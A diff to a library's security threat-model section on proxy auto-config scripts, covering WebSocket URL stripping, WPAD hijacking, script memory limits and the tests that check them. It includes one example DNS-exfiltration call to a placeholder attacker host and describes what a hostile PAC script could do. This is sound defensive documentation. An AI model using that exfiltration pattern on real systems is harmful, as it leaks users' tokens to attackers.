@@ -405,9 +405,12 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   learns is the URL it is passed and what it resolves through `dnsResolve`. For `https` and `wss` the URL is the origin
   only (`wss://host[:port]/`), as Chrome (CVE-2016-5134), Android (CVE-2016-3763) and Firefox give it, so a token in a
   path or query cannot leak through `dnsResolve("<data>.attacker.example")`; `ws` keeps its resource name (RFC 6455
-  §4.1; a `ws://` request is readable on the wire anyway) and `http` gives the origin. Only with
-  `pacFullWebSocketUrl`, and only for the script the settings name (never one WPAD found), does a `wss` URI reach the
-  script whole. The same URI rule holds on Windows, where WinHTTP runs the script.
+  §4.1; a `ws://` request is readable on the wire anyway) and `http` gives the origin (the engine keeps answers per
+  scheme, host and port; browsers pass an `http` path). Only with `pacFullWebSocketUrl`, and only for the script the
+  settings name when it is given inline or by an `https` or `file` URL (never one WPAD found or one over plain `http`,
+  which a LAN attacker can serve as easily), does a `wss` URI reach the script whole; on Apple platforms the entry's
+  URL must equal the settings' string exactly, and a mismatch gives the origin. The same URI rule holds on Windows,
+  where WinHTTP runs the script. A run's 20 lookups count in total: a name looked up by both families counts twice.
 - **Residual (accepted):** the engine uses JavaScriptCore's public API only; the execution time limit of
   `JSContextGroupSetExecutionTimeLimit` is declared in a private header and was left out for App Review. So a hostile
   script (a PAC URL an attacker controls, or, on a LAN, whoever answers WPAD's DHCP option or `wpad.<domain>`, which
@@ -418,8 +421,8 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   and deep recursion at its stack check, but a script that allocates without end (an array that grows) can grow the
   process for up to the run's 2 s and on, on its abandoned thread, until it ends or the system stops the process; only
   the time limit and the release of an abandoned thread's contexts bound it. With `pacFullWebSocketUrl` on, the script
-  the settings name sees `wss` paths and queries: an application turns it on only for a script it trusts, served over
-  `https` or as a file. A script served by a WPAD hijacker can
+  the settings name sees `wss` paths and queries: an application turns it on only for a script it trusts; a server
+  behind the `https` PAC URL that is compromised, or a local file someone else can write, still reads them. A script served by a WPAD hijacker can
   send plain `http` and WebSocket `ws` traffic through a proxy of its choice, or direct, as on every platform that runs
   WPAD; `https` and `wss` stay protected by TLS to the origin.
 - **Verification:** `pac.PacEngineAppleTest.negative_theScriptHasNoHostAccess`, `.negative_runawayScriptIsAbandonedAndPacRecovers`,
@@ -429,9 +432,10 @@ Pre-release status (fallback): the fallback from HTTP/3 to HTTP/1.1 uses the sam
   `.negative_discoveredUrlIsHttpOnly`, `.answersAreParsed`, `.negative_dnsLookupsAreCappedPerRun`, `.negative_hugeAnswerIsRefused`,
   `.negative_malformedAnswersFail`, `.negative_malformedEntriesAreSkipped`, `.negative_deepRecursionFailsAndPacRecovers`,
   `.negative_stringBombFailsAndPacRecovers`, `.negative_busyLoopIsAbandonedAndPacRecovers`, `.negative_oversizedInlineScriptIsRefused`,
-  `.negative_hugeThrownValueIsNotCopied`, `.negative_wssScriptsGetTheOriginUnlessTheSettingsNameThemAndTheAppOptsIn` (macOS);
+  `.negative_hugeThrownValueIsNotCopied`, `.negative_wssScriptsGetTheOriginUnlessTheSettingsNameThemAndTheAppOptsIn`,
+  `.negative_plainHttpPacUrlGetsTheOriginEvenWhenNamed` (macOS);
   `ProxyResolverTest.negative_unsupportedOnlyPacAnswerFailsClosed`, `.negative_pacTargetOfASecureUrlIsItsOriginOnly`,
-  `.negative_wpadScriptOnWindowsGetsTheOriginOnly`.
+  `.negative_wpadScriptOnWindowsGetsTheOriginOnly`, `.negative_plainHttpPacUrlOnWindowsGetsTheOriginOnly`, `.pacHostIsLowerCase`.
 
 ### 3.21 TCP peers that read slowly or not at all (JVM and Android)
 
